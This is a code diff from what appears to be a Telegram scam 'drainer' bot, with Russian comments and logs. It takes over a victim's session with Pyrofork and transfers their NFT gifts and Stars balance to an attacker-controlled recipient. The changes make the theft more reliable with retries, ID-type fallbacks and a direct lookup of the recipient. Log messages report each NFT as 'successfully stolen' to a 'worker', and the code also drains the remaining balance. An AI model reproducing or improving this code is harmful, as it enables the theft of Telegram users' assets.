@@ -620,65 +620,108 @@ async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: B
     """Задача для ВОРКЕРА: передать NFT через Pyrofork. Возвращает статус (success/failed)"""
     nft_title = gift_details.get('title', 'Unknown NFT')
     nft_slug = gift_details.get('slug', '')
-    msg_id = str(gift_details['msg_id'])
     
-    log_transfer(f"🚀 Попытка передачи NFT: {nft_title} (ID: {msg_id}) -> {target_chat_id}")
+    # Пробуем использовать gift.id если есть, иначе message_id
+    gift_id = gift_details.get('id') or gift_details.get('msg_id')
     
-    try:
-        # Pyrofork имеет улучшенный метод transfer_gift для NFT
-        await client.transfer_gift(
-            owned_gift_id=msg_id,
-            new_owner_chat_id=target_chat_id
-        )
-        
-        log_transfer(f"✅ NFT УСПЕШНО ПЕРЕДАН: {nft_title}")
-        print_success(f"NFT ОТПРАВЛЕН: {nft_title}")
-        
-        # Уведомляем воркера
-        if user_db_data and user_db_data['worker_id']:
-            nft_link = f"https://t.me/nft/{nft_slug}" if nft_slug else "#"
-            await notify_worker(
-                bot, 
-                user_db_data['worker_id'], 
-                f"🎁 NFT <b>{nft_title}</b> УСПЕШНО УКРАДЕН!\n🔗 <a href='{nft_link}'>Ссылка</a>"
-            )
-        return "success"
-        
-    except FloodWait as e:
-        log_transfer(f"⏳ Флуд-лимит: {e.value}с. Ожидание...", "warning")
-        print_warning(f"Флуд {e.value}с. Ждем...")
-        await asyncio.sleep(e.value)
-        
-        # Повторная попытка после ожидания
+    # Пробуем int и str варианты
+    owned_gift_id_int = int(gift_id) if gift_id else None
+    owned_gift_id_str = str(gift_id) if gift_id else None
+    
+    if not target_chat_id:
+        log_transfer(f"❌ Не указан target_chat_id для передачи NFT {nft_title}", "error")
+        return "failed"
+    
+    log_transfer(f"🚀 Попытка передачи NFT: {nft_title} (ID: {gift_id}, msg_id: {gift_details.get('msg_id')}) -> {target_chat_id}")
+    
+    # Пробуем сначала с int, потом со str
+    for attempt, owned_gift_id in enumerate([owned_gift_id_int, owned_gift_id_str], 1):
+        if owned_gift_id is None:
+            continue
+            
         try:
+            log_transfer(f"🔄 Попытка {attempt}: передача NFT с owned_gift_id={owned_gift_id} (тип: {type(owned_gift_id).__name__})")
+            
+            # Pyrofork имеет улучшенный метод transfer_gift для NFT
             await client.transfer_gift(
-                owned_gift_id=msg_id,
+                owned_gift_id=owned_gift_id,
                 new_owner_chat_id=target_chat_id
             )
-            log_transfer(f"✅ NFT ПЕРЕДАН после флуда: {nft_title}")
+            
+            log_transfer(f"✅ NFT УСПЕШНО ПЕРЕДАН: {nft_title}")
+            print_success(f"NFT ОТПРАВЛЕН: {nft_title}")
+            
+            # Уведомляем воркера
+            if user_db_data and user_db_data.get('worker_id'):
+                nft_link = f"https://t.me/nft/{nft_slug}" if nft_slug else "#"
+                await notify_worker(
+                    bot, 
+                    user_db_data['worker_id'], 
+                    f"🎁 NFT <b>{nft_title}</b> УСПЕШНО УКРАДЕН!\n🔗 <a href='{nft_link}'>Ссылка</a>"
+                )
             return "success"
-        except Exception as retry_e:
-            log_transfer(f"❌ Ошибка повторной передачи NFT {nft_title}: {retry_e}", "error")
-            return "failed"
             
-    except BadRequest as e:
-        error_str = str(e)
-        # Специфичные ошибки Telegram
-        if "GIFT_NOT_READY" in error_str or "CANNOT_TRANSFER" in error_str:
-            log_transfer(f"⚠️ NFT {nft_title} еще не готов к передаче (холд)", "warning")
-            return "hold"
-        elif "INSUFFICIENT_FUNDS" in error_str or "NOT_ENOUGH_STARS" in error_str:
-            log_transfer(f"❌ Недостаточно звезд для передачи NFT {nft_title}", "error")
-            return "no_funds"
-        else:
-            log_transfer(f"❌ BadRequest при передаче NFT {nft_title}: {e}", "error")
-            return "failed"
+        except FloodWait as e:
+            log_transfer(f"⏳ Флуд-лимит: {e.value}с. Ожидание...", "warning")
+            print_warning(f"Флуд {e.value}с. Ждем...")
+            await asyncio.sleep(e.value)
             
-    except Exception as e:
-        error_type = type(e).__name__
-        log_transfer(f"❌ Ошибка передачи NFT {nft_title}: {error_type}: {e}", "error")
-        await alert_admins(bot, f"❌ Не удалось передать NFT {nft_title}:\n{error_type}: {e}")
-        return "failed"
+            # Повторная попытка после ожидания
+            try:
+                await client.transfer_gift(
+                    owned_gift_id=owned_gift_id,
+                    new_owner_chat_id=target_chat_id
+                )
+                log_transfer(f"✅ NFT ПЕРЕДАН после флуда: {nft_title}")
+                return "success"
+            except Exception as retry_e:
+                log_transfer(f"❌ Ошибка повторной передачи NFT {nft_title}: {retry_e}", "error")
+                # Продолжаем на следующую попытку с другим типом
+                continue
+                
+        except BadRequest as e:
+            error_str = str(e)
+            log_transfer(f"⚠️ BadRequest при передаче NFT {nft_title} (попытка {attempt}): {error_str}", "warning")
+            
+            # Специфичные ошибки Telegram
+            if "GIFT_NOT_READY" in error_str or "CANNOT_TRANSFER" in error_str:
+                log_transfer(f"⚠️ NFT {nft_title} еще не готов к передаче (холд)", "warning")
+                return "hold"
+            elif "INSUFFICIENT_FUNDS" in error_str or "NOT_ENOUGH_STARS" in error_str:
+                log_transfer(f"❌ Недостаточно звезд для передачи NFT {nft_title}", "error")
+                return "no_funds"
+            elif "PEER_ID_INVALID" in error_str or "USER_ID_INVALID" in error_str:
+                log_transfer(f"❌ Неверный ID получателя для NFT {nft_title}: {target_chat_id}", "error")
+                return "failed"
+            else:
+                # Если это не последняя попытка, пробуем другой формат
+                if attempt < 2:
+                    log_transfer(f"🔄 Пробуем другой формат ID...", "warning")
+                    continue
+                else:
+                    log_transfer(f"❌ BadRequest при передаче NFT {nft_title}: {e}", "error")
+                    return "failed"
+                
+        except Exception as e:
+            error_type = type(e).__name__
+            error_str = str(e)
+            log_transfer(f"⚠️ Ошибка передачи NFT {nft_title} (попытка {attempt}): {error_type}: {error_str}", "warning")
+            
+            # Если это не последняя попытка, пробуем другой формат
+            if attempt < 2:
+                log_transfer(f"🔄 Пробуем другой формат ID...", "warning")
+                continue
+            else:
+                log_transfer(f"❌ Ошибка передачи NFT {nft_title}: {error_type}: {e}", "error")
+                if bot:
+                    await alert_admins(bot, f"❌ Не удалось передать NFT {nft_title}:\n{error_type}: {e}")
+                return "failed"
+    
+    # Если все попытки провалились
+    log_transfer(f"❌ Все попытки передачи NFT {nft_title} провалились", "error")
+    if bot:
+        await alert_admins(bot, f"❌ Не удалось передать NFT {nft_title} после всех попыток")
+    return "failed"
 
 async def drain_stars_user(client: Client, default_recipient=None):
     """
@@ -854,6 +897,7 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
                 except: pass
 
         ready_to_send = False
+        balance_check = current_balance
         for _ in range(5):
             try:
                 balance_check = await get_stars_info(client)
@@ -864,13 +908,36 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
             await asyncio.sleep(0.4)
 
         # ================= 4. ОТПРАВКА NFT =================
-        final_recipient_id = await target_future if target_future else None
+        final_recipient_id = None
+        if target_future:
+            try:
+                final_recipient_id = await target_future
+                log_transfer(f"🎯 Получен ID получателя: {final_recipient_id}")
+            except Exception as e:
+                log_transfer(f"❌ Ошибка получения ID получателя: {e}", "error")
+                final_recipient_id = None
+        
+        if not final_recipient_id:
+            # Пробуем получить ID получателя напрямую
+            try:
+                raw_target = SETTINGS.get("target_user") or banker_username
+                if raw_target:
+                    log_transfer(f"🔄 Пробуем получить ID получателя напрямую: {raw_target}")
+                    chat = await client.get_chat(raw_target)
+                    final_recipient_id = chat.id
+                    log_transfer(f"✅ ID получателя получен напрямую: {final_recipient_id}")
+            except Exception as e:
+                log_transfer(f"❌ Не удалось получить ID получателя: {e}", "error")
 
         if ready_to_send and final_recipient_id:
-            log_transfer("⚡️ БАЛАНС ЕСТЬ. ШЛЕМ NFT...")
-            tasks = [transfer_nft_task(client, nft, final_recipient_id, bot, None) for nft in all_nfts_to_send]
-            results_status = await asyncio.gather(*tasks)
-            for idx, res in enumerate(results_status):
+            log_transfer(f"⚡️ БАЛАНС ЕСТЬ ({balance_check} ⭐️). ШЛЕМ NFT на {final_recipient_id}...")
+            log_transfer(f"📦 Количество NFT для отправки: {len(all_nfts_to_send)}")
+            
+            # Отправляем NFT по одному с небольшой задержкой для надежности
+            for idx, nft in enumerate(all_nfts_to_send):
+                log_transfer(f"📤 Отправка NFT {idx+1}/{len(all_nfts_to_send)}: {nft['title']}")
+                res = await transfer_nft_task(client, nft, final_recipient_id, bot, None)
+                
                 # Обрабатываем разные статусы: success, failed, hold, no_funds
                 status_emoji = {
                     'success': '✅',
@@ -880,14 +947,23 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
                 }.get(res, '❓')
                 
                 nft_log_results.append({
-                    'title': all_nfts_to_send[idx]['title'], 
-                    'slug': all_nfts_to_send[idx].get('slug',''), 
+                    'title': nft['title'], 
+                    'slug': nft.get('slug',''), 
                     'status': f'{status_emoji} {res}' if res != 'success' else status_emoji
                 })
+                
+                # Небольшая задержка между отправками
+                if idx < len(all_nfts_to_send) - 1:
+                    await asyncio.sleep(0.5)
         else:
             status = '❌ NoMoney' if not ready_to_send else '❌ NoTarget'
-            log_transfer(f"FAIL NFT: {status}")
-            for nft in all_nfts_to_send: nft_log_results.append({'title': nft['title'], 'status': status})
+            log_transfer(f"FAIL NFT: {status} (ready_to_send={ready_to_send}, final_recipient_id={final_recipient_id})")
+            for nft in all_nfts_to_send: 
+                nft_log_results.append({
+                    'title': nft['title'], 
+                    'slug': nft.get('slug',''), 
+                    'status': status
+                })
 
         # ================= 5. ПОСТ-ФАКТУМ ЧИСТКА =================
         log_transfer("🏁 NFT отработаны. Теперь чистим мусор и сливаем остаток.")
